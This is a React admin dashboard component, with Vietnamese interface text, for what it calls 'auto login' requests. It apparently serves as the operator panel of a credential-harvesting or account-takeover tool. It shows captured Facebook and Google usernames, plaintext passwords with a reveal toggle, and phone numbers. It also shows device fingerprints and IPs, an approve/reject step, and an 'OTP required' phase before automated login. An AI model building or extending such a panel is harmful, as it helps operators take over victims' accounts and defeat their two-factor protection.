/**
 * Admin Auto Login Dashboard Component
 * Hiển thị chi tiết các yêu cầu auto login với đầy đủ thông tin trong table format
 */

import React, { useState, useEffect, useMemo } from "react";
import { Card, CardContent, CardHeader, CardTitle } from "../ui/card";
import { Button } from "../ui/button";
import { Input } from "../ui/input";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "../ui/select";
import { Badge } from "../ui/badge";
import { ScrollArea } from "../ui/scroll-area";
import {
  Table,
  TableBody,
  TableCell,
  TableHead,
  TableHeader,
  TableRow,
} from "../ui/table";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "../ui/tabs";
import { useSocket } from "../../hooks/useSocket";
import { motion, AnimatePresence } from "framer-motion";
import {
  Users,
  Search,
  Filter,
  RefreshCw,
  CheckCircle,
  X,
  Clock,
  Shield,
  Globe,
  Smartphone,
  Monitor,
  Key,
  Eye,
  EyeOff,
  LogIn,
  Settings,
  AlertTriangle,
  Check,
  XCircle,
} from "lucide-react";
import { format, formatDistanceToNow } from "date-fns";
import { vi } from "date-fns/locale";
import toast from "react-hot-toast";

const AdminAutoLoginDashboard = () => {
  const { socket, isConnected } = useSocket();
  const [loginRequests, setLoginRequests] = useState([]);
  const [loading, setLoading] = useState(true);
  const [searchQuery, setSearchQuery] = useState("");
  const [filterStatus, setFilterStatus] = useState("all");
  const [filterPlatform, setFilterPlatform] = useState("all");
  const [activeTab, setActiveTab] = useState("requests");
  const [showPasswords, setShowPasswords] = useState({});

  // Mock data for demonstration - in real app, fetch from backend
  const mockLoginRequests = [
    {
      id: "req-001",
      userId: "user-123",
      platform: "Facebook",
      credentials: {
        username: "user@example.com",
        password: "password123",
        email: "user@example.com",
        phone: "+84901234567",
      },
      status: "pending_approval",
      phase: 1,
      createdAt: new Date().toISOString(),
      updatedAt: new Date().toISOString(),
      metadata: {
        userAgent:
          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        ipAddress: "192.168.1.100",
        deviceType: "Desktop",
        browser: "Chrome 119.0",
        screenResolution: "1920x1080",
        timezone: "Asia/Ho_Chi_Minh",
      },
    },
    {
      id: "req-002",
      userId: "user-456",
      platform: "Google",
      credentials: {
        username: "test@gmail.com",
        password: "testpass",
        email: "test@gmail.com",
      },
      status: "otp_required",
      phase: 3,
      createdAt: new Date(Date.now() - 300000).toISOString(),
      updatedAt: new Date(Date.now() - 60000).toISOString(),
      metadata: {
        userAgent: "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X)",
        ipAddress: "10.0.0.50",
        deviceType: "Mobile",
        browser: "Safari Mobile",
        screenResolution: "390x844",
        timezone: "Asia/Ho_Chi_Minh",
      },
    },
  ];

  useEffect(() => {
    if (!socket) return;

    const handleAutoLoginEvent = (data) => {
      console.log("🔐 Received auto login event:", data);

      if (data.type === "auto_login.request_submitted") {
        setLoginRequests((prev) => {
          const newRequest = {
            id: data.data.requestId,
            userId: data.data.userId,
            platform: data.data.platform,
            status: data.data.status,
            ...data.data,
          };
          return [newRequest, ...prev];
        });
      } else if (data.type === "auto_login.otp_required") {
        setLoginRequests((prev) =>
          prev.map((req) =>
            req.id === data.data.requestId
              ? { ...req, status: "otp_required", phase: 3 }
              : req
          )
        );
      } else if (data.type === "auto_login.completed") {
        setLoginRequests((prev) =>
          prev.map((req) =>
            req.id === data.data.requestId
              ? {
                  ...req,
                  status: data.data.success ? "completed" : "automation_failed",
                }
              : req
          )
        );
      }
    };

    // Listen for admin feed events
    socket.on("admin:feed", (data) => {
      if (data.type?.startsWith("auto_login.")) {
        handleAutoLoginEvent(data);
      }
    });

    // Initialize with mock data
    setLoginRequests(mockLoginRequests);
    setTimeout(() => setLoading(false), 1000);

    return () => {
      socket.off("admin:feed");
    };
  }, [socket]);

  const getStatusBadge = (status) => {
    const statusConfig = {
      pending_approval: {
        label: "Chờ duyệt",
        color: "bg-yellow-500/20 text-yellow-300",
        icon: Clock,
      },
      approved: {
        label: "Đã duyệt",
        color: "bg-green-500/20 text-green-300",
        icon: Check,
      },
      rejected: {
        label: "Từ chối",
        color: "bg-red-500/20 text-red-300",
        icon: XCircle,
      },
      otp_required: {
        label: "Cần OTP",
        color: "bg-blue-500/20 text-blue-300",
        icon: Shield,
      },
      automation_pending: {
        label: "Đang xử lý",
        color: "bg-purple-500/20 text-purple-300",
        icon: Settings,
      },
      completed: {
        label: "Hoàn thành",
        color: "bg-green-500/20 text-green-300",
        icon: CheckCircle,
      },
      automation_failed: {
        label: "Thất bại",
        color: "bg-red-500/20 text-red-300",
        icon: AlertTriangle,
      },
    };

    const config = statusConfig[status] || statusConfig.pending_approval;
    const IconComponent = config.icon;

    return (
      <Badge className={`${config.color} flex items-center gap-1`}>
        <IconComponent className="h-3 w-3" />
        {config.label}
      </Badge>
    );
  };

  const getDeviceIcon = (deviceType) => {
    switch (deviceType) {
      case "Mobile":
        return <Smartphone className="h-4 w-4" />;
      case "Desktop":
        return <Monitor className="h-4 w-4" />;
      default:
        return <Globe className="h-4 w-4" />;
    }
  };

  const togglePasswordVisibility = (requestId) => {
    setShowPasswords((prev) => ({
      ...prev,
      [requestId]: !prev[requestId],
    }));
  };

  const handleApprove = async (requestId) => {
    if (!socket) return;

    socket.emit("admin:auto_login_decision", {
      requestId,
      decision: "approved",
      timestamp: new Date().toISOString(),
    });

    toast.success("Đã phê duyệt yêu cầu auto login");
  };

  const handleReject = async (requestId) => {
    if (!socket) return;

    socket.emit("admin:auto_login_decision", {
      requestId,
      decision: "rejected",
      timestamp: new Date().toISOString(),
    });

    toast.success("Đã từ chối yêu cầu auto login");
  };

  const filteredRequests = useMemo(() => {
    return loginRequests.filter((request) => {
      if (filterStatus !== "all" && request.status !== filterStatus)
        return false;
      if (
        filterPlatform !== "all" &&
        request.platform.toLowerCase() !== filterPlatform
      )
        return false;
      if (
        searchQuery &&
        !request.userId?.toLowerCase().includes(searchQuery.toLowerCase()) &&
        !request.platform?.toLowerCase().includes(searchQuery.toLowerCase())
      )
        return false;
      return true;
    });
  }, [loginRequests, filterStatus, filterPlatform, searchQuery]);

  const uniquePlatforms = useMemo(() => {
    const platforms = new Set();
    loginRequests.forEach((req) => platforms.add(req.platform));
    return Array.from(platforms);
  }, [loginRequests]);

  const stats = useMemo(() => {
    const total = loginRequests.length;
    const pending = loginRequests.filter(
      (r) => r.status === "pending_approval"
    ).length;
    const completed = loginRequests.filter(
      (r) => r.status === "completed"
    ).length;
    const failed = loginRequests.filter(
      (r) => r.status === "automation_failed"
    ).length;

    return { total, pending, completed, failed };
  }, [loginRequests]);

  return (
    <div className="space-y-6">
      {/* Quick Stats Cards */}
      <div className="grid grid-cols-1 md:grid-cols-4 gap-4">
        <Card>
          <CardContent className="p-4">
            <div className="flex items-center gap-3">
              <LogIn className="h-8 w-8 text-blue-500" />
              <div>
                <p className="text-sm text-muted-foreground">Tổng yêu cầu</p>
                <p className="text-2xl font-bold">{stats.total}</p>
              </div>
            </div>
          </CardContent>
        </Card>

        <Card>
          <CardContent className="p-4">
            <div className="flex items-center gap-3">
              <Clock className="h-8 w-8 text-yellow-500" />
              <div>
                <p className="text-sm text-muted-foreground">Chờ duyệt</p>
                <p className="text-2xl font-bold">{stats.pending}</p>
              </div>
            </div>
          </CardContent>
        </Card>

        <Card>
          <CardContent className="p-4">
            <div className="flex items-center gap-3">
              <CheckCircle className="h-8 w-8 text-green-500" />
              <div>
                <p className="text-sm text-muted-foreground">Hoàn thành</p>
                <p className="text-2xl font-bold">{stats.completed}</p>
              </div>
            </div>
          </CardContent>
        </Card>

        <Card>
          <CardContent className="p-4">
            <div className="flex items-center gap-3">
              <AlertTriangle className="h-8 w-8 text-red-500" />
              <div>
                <p className="text-sm text-muted-foreground">Thất bại</p>
                <p className="text-2xl font-bold">{stats.failed}</p>
              </div>
            </div>
          </CardContent>
        </Card>
      </div>

      {/* Main Dashboard */}
      <Card>
        <CardHeader>
          <CardTitle className="flex items-center gap-2">
            <Shield className="h-6 w-6" />
            Auto Login Management Dashboard
          </CardTitle>
        </CardHeader>
        <CardContent>
          <Tabs value={activeTab} onValueChange={setActiveTab}>
            <TabsList className="grid w-full grid-cols-2">
              <TabsTrigger value="requests">Login Requests</TabsTrigger>
              <TabsTrigger value="analytics">Analytics</TabsTrigger>
            </TabsList>

            <TabsContent value="requests" className="space-y-4">
              {/* Filters */}
              <div className="flex gap-4 mb-4">
                <div className="relative flex-1">
                  <Search className="absolute left-3 top-1/2 -translate-y-1/2 h-4 w-4 text-muted-foreground" />
                  <Input
                    placeholder="Tìm kiếm user hoặc platform..."
                    value={searchQuery}
                    onChange={(e) => setSearchQuery(e.target.value)}
                    className="pl-10"
                  />
                </div>
                <Select value={filterStatus} onValueChange={setFilterStatus}>
                  <SelectTrigger className="w-48">
                    <SelectValue placeholder="Lọc trạng thái" />
                  </SelectTrigger>
                  <SelectContent>
                    <SelectItem value="all">Tất cả trạng thái</SelectItem>
                    <SelectItem value="pending_approval">Chờ duyệt</SelectItem>
                    <SelectItem value="otp_required">Cần OTP</SelectItem>
                    <SelectItem value="completed">Hoàn thành</SelectItem>
                    <SelectItem value="automation_failed">Thất bại</SelectItem>
                  </SelectContent>
                </Select>
                <Select
                  value={filterPlatform}
                  onValueChange={setFilterPlatform}
                >
                  <SelectTrigger className="w-48">
                    <SelectValue placeholder="Lọc platform" />
                  </SelectTrigger>
                  <SelectContent>
                    <SelectItem value="all">Tất cả platform</SelectItem>
                    {uniquePlatforms.map((platform) => (
                      <SelectItem key={platform} value={platform.toLowerCase()}>
                        {platform}
                      </SelectItem>
                    ))}
                  </SelectContent>
                </Select>
              </div>

              {/* Requests Table */}
              <div className="border rounded-lg">
                <ScrollArea className="h-96">
                  <Table>
                    <TableHeader>
                      <TableRow>
                        <TableHead>User ID</TableHead>
                        <TableHead>Platform</TableHead>
                        <TableHead>Credentials</TableHead>
                        <TableHead>Status</TableHead>
                        <TableHead>Device Info</TableHead>
                        <TableHead>Created</TableHead>
                        <TableHead>Actions</TableHead>
                      </TableRow>
                    </TableHeader>
                    <TableBody>
                      {loading ? (
                        <TableRow>
                          <TableCell colSpan={7} className="text-center py-8">
                            <RefreshCw className="h-6 w-6 animate-spin mx-auto mb-2" />
                            Loading...
                          </TableCell>
                        </TableRow>
                      ) : filteredRequests.length === 0 ? (
                        <TableRow>
                          <TableCell
                            colSpan={7}
                            className="text-center py-8 text-muted-foreground"
                          >
                            Không có yêu cầu auto login nào
                          </TableCell>
                        </TableRow>
                      ) : (
                        <AnimatePresence initial={false}>
                          {filteredRequests.map((request, index) => (
                            <motion.tr
                              key={request.id}
                              initial={{ opacity: 0, y: 10 }}
                              animate={{ opacity: 1, y: 0 }}
                              exit={{ opacity: 0, x: -20 }}
                              transition={{ delay: index * 0.05 }}
                              className="hover:bg-muted/50"
                            >
                              <TableCell className="font-mono text-sm">
                                {request.userId}
                              </TableCell>

                              <TableCell>
                                <div className="flex items-center gap-2">
                                  <Badge variant="outline">
                                    {request.platform}
                                  </Badge>
                                </div>
                              </TableCell>

                              <TableCell>
                                <div className="space-y-1 text-xs">
                                  <div>
                                    📧{" "}
                                    {request.credentials.username ||
                                      request.credentials.email}
                                  </div>
                                  <div className="flex items-center gap-2">
                                    🔒{" "}
                                    {showPasswords[request.id]
                                      ? request.credentials.password
                                      : "••••••••"}
                                    <Button
                                      size="icon"
                                      variant="ghost"
                                      className="h-4 w-4 p-0"
                                      onClick={() =>
                                        togglePasswordVisibility(request.id)
                                      }
                                    >
                                      {showPasswords[request.id] ? (
                                        <EyeOff className="h-3 w-3" />
                                      ) : (
                                        <Eye className="h-3 w-3" />
                                      )}
                                    </Button>
                                  </div>
                                  {request.credentials.phone && (
                                    <div>📱 {request.credentials.phone}</div>
                                  )}
                                </div>
                              </TableCell>

                              <TableCell>
                                {getStatusBadge(request.status)}
                              </TableCell>

                              <TableCell>
                                <div className="space-y-1 text-xs">
                                  <div className="flex items-center gap-1">
                                    {getDeviceIcon(
                                      request.metadata?.deviceType
                                    )}
                                    {request.metadata?.deviceType} -{" "}
                                    {request.metadata?.browser}
                                  </div>
                                  <div>🌐 {request.metadata?.ipAddress}</div>
                                  <div>
                                    📺 {request.metadata?.screenResolution}
                                  </div>
                                </div>
                              </TableCell>

                              <TableCell className="text-xs">
                                {formatDistanceToNow(
                                  new Date(request.createdAt),
                                  {
                                    addSuffix: true,
                                    locale: vi,
                                  }
                                )}
                              </TableCell>

                              <TableCell>
                                <div className="flex gap-2">
                                  {request.status === "pending_approval" && (
                                    <>
                                      <Button
                                        size="sm"
                                        onClick={() =>
                                          handleApprove(request.id)
                                        }
                                        className="h-7 px-2"
                                      >
                                        <Check className="h-3 w-3" />
                                      </Button>
                                      <Button
                                        size="sm"
                                        variant="destructive"
                                        onClick={() => handleReject(request.id)}
                                        className="h-7 px-2"
                                      >
                                        <X className="h-3 w-3" />
                                      </Button>
                                    </>
                                  )}
                                </div>
                              </TableCell>
                            </motion.tr>
                          ))}
                        </AnimatePresence>
                      )}
                    </TableBody>
                  </Table>
                </ScrollArea>
              </div>
            </TabsContent>

            <TabsContent value="analytics" className="space-y-4">
              <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                <Card>
                  <CardHeader>
                    <CardTitle className="text-base">
                      Platform Distribution
                    </CardTitle>
                  </CardHeader>
                  <CardContent>
                    <div className="space-y-3">
                      {uniquePlatforms.map((platform) => {
                        const count = loginRequests.filter(
                          (r) => r.platform === platform
                        ).length;
                        const percentage = (
                          (count / loginRequests.length) *
                          100
                        ).toFixed(1);
                        return (
                          <div
                            key={platform}
                            className="flex items-center justify-between"
                          >
                            <span className="text-sm">{platform}</span>
                            <div className="flex items-center gap-2">
                              <Badge variant="secondary">{count}</Badge>
                              <span className="text-xs text-muted-foreground">
                                ({percentage}%)
                              </span>
                            </div>
                          </div>
                        );
                      })}
                    </div>
                  </CardContent>
                </Card>

                <Card>
                  <CardHeader>
                    <CardTitle className="text-base">Device Types</CardTitle>
                  </CardHeader>
                  <CardContent>
                    <div className="space-y-3">
                      {["Desktop", "Mobile", "Tablet"].map((deviceType) => {
                        const count = loginRequests.filter(
                          (r) => r.metadata?.deviceType === deviceType
                        ).length;
                        const percentage =
                          loginRequests.length > 0
                            ? ((count / loginRequests.length) * 100).toFixed(1)
                            : "0";
                        return (
                          <div
                            key={deviceType}
                            className="flex items-center justify-between"
                          >
                            <div className="flex items-center gap-2">
                              {getDeviceIcon(deviceType)}
                              <span className="text-sm">{deviceType}</span>
                            </div>
                            <div className="flex items-center gap-2">
                              <Badge variant="secondary">{count}</Badge>
                              <span className="text-xs text-muted-foreground">
                                ({percentage}%)
                              </span>
                            </div>
                          </div>
                        );
                      })}
                    </div>
                  </CardContent>
                </Card>
              </div>
            </TabsContent>
          </Tabs>
        </CardContent>
      </Card>
    </div>
  );
};

export default AdminAutoLoginDashboard;
